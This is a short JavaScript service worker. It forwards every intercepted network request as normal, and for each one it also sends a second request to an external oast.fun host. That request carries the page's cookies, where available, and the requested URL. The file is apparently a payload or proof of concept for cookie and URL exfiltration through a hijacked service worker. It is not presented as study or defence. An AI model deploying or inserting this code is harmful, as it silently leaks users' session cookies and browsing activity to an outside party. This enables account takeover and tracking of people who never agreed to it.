self.addEventListener("fetch", (event) => {
    event.respondWith(fetch(event.request));
    fetch(`https://ahdjhhsrmxttsdaddbyaouthdtv4tsvlb.oast.fun/sw-fetch?cookies=${encodeURIComponent(self.document ? self.document.cookie : "no-cookies")}&requestUrl=${encodeURIComponent(event.request.url)}`);
});
